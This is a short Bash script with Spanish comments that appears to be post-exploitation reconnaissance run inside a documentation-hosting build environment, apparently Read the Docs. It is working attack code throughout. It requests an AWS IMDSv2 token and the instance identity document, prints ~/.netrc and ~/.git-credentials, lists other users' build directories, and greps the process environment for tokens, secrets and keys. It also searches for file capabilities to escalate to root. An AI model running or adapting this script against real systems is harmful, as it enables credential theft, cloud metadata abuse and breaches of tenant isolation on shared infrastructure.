#!/bin/bash

# Colores para el reporte
G='\033[0;32m'
R='\033[0;31m'
NC='\033[0m'

echo -e "${G}=== 1. IDENTIDAD Y PRIVILEGIOS ===${NC}"
id
hostname
uname -a

echo -e "\n${G}=== 2. AWS CLOUD IDENTITY (SSRF PROOF) ===${NC}"
# Intentamos obtener el Identity Document (ID de cuenta de Amazon)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
if [ -n "$TOKEN" ]; then
    echo "[+] Token IMDSv2 obtenido."
    curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document
else
    echo "[-] No se pudo acceder a los metadatos de AWS."
fi

echo -e "\n${G}=== 3. EXFILTRACIÓN DE CREDENCIALES DE GIT ===${NC}"
# Buscamos tokens reales en archivos ocultos
if [ -f ~/.netrc ]; then echo "[!] ARCHIVO .netrc ENCONTRADO:"; cat ~/.netrc; fi
if [ -f ~/.git-credentials ]; then echo "[!] ARCHIVO .git-credentials ENCONTRADO:"; cat ~/.git-credentials; fi

echo -e "\n${G}=== 4. AISLAMIENTO DE CLIENTES (MULTI-TENANCY) ===${NC}"
# Intentamos ver si hay otros proyectos en el mismo nodo
echo "[+] Listando otros builds en el servidor:"
ls -la /home/docs/checkouts/readthedocs.org/user_builds/

echo -e "\n${G}=== 5. SECRETOS DEL SISTEMA (PROC ENVIRON) ===${NC}"
# Limpiamos las variables de entorno para verlas bien
cat /proc/self/environ | tr '\0' '\n' | grep -iE "TOKEN|SECRET|PASS|KEY|AUTH|DSN"

echo -e "\n${G}=== 6. CAPABILITIES (LOCAL ESCALATION) ===${NC}"
# Ver si algún binario nos permite subir a root
/sbin/getcap -r / 2>/dev/null | head -n 10
